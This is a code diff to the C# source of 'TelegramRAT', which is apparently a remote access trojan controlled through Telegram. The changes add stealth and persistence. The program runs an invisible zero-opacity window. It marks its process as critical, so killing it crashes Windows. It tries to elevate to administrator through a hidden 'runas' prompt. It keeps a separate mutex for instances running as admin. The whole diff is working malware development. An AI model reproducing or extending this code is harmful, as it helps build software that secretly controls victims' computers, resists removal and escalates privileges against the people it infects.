@@ -8,11 +8,14 @@
 
 using System;
 using System.Collections.Generic;
+using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
 using System.Management;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.AccessControl;
+using System.Security.Principal;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -61,7 +64,6 @@ namespace TelegramRAT
             static extern bool SetProcessShutdownParameters(uint dwLevel, uint dwFlags);
 
 
-
             // Invisible Form
             public MainForm()
             {
@@ -70,6 +72,7 @@ namespace TelegramRAT
                 this.Visible = false;
                 this.Opacity = 0.0;
                 this.Load += new EventHandler(MainForm_Load);
+
                 SetProcessShutdownParameters(0x3FF, SHUTDOWN_NORETRY);
             }
             // Change form size
@@ -159,7 +162,7 @@ namespace TelegramRAT
         // Protect process
         public static void protectProcess()
         {
-            if(config.ProcessProtectionEnabled)
+            if(config.ProcessBSODProtectionEnabled)
             {
                 Console.WriteLine("[+] Set process critical");
                 try
@@ -174,7 +177,7 @@ namespace TelegramRAT
         // Unprotect process
         public static void unprotectProcess()
         {
-            if (config.ProcessProtectionEnabled)
+            if (config.ProcessBSODProtectionEnabled)
             {
                 try
                 {
@@ -316,14 +319,18 @@ namespace TelegramRAT
                 {
                     Console.WriteLine("[~] Trying elevate previleges to administrator...");
                     Process proc = new Process();
+                    proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                     proc.StartInfo.FileName = Application.ExecutablePath;
+                    proc.StartInfo.Arguments = "";
                     proc.StartInfo.UseShellExecute = true;
                     proc.StartInfo.Verb = "runas";
+                    proc.StartInfo.CreateNoWindow = true;
                     try
                     {
                         proc.Start();
                         proc.WaitForExit();
                         unprotectProcess();
+                        Console.WriteLine("Done!");
                         Environment.Exit(1);
                     }
                     catch (System.ComponentModel.Win32Exception)
@@ -429,7 +436,14 @@ namespace TelegramRAT
         public static void CheckMutex()
         {
             bool createdNew = false;
-            Mutex currentApp = new Mutex(false, utils.MD5(config.TelegramChatID), out createdNew);
+            // For elevation
+            string mutex = utils.MD5(config.TelegramChatID);
+            if(utils.IsAdministrator())
+            {
+                mutex = "ADMIN:" + mutex;
+            }
+            // Check
+            Mutex currentApp = new Mutex(false, mutex, out createdNew);
             if (!createdNew)
             {
                 Console.WriteLine("[?] Already running 1 copy of the program");
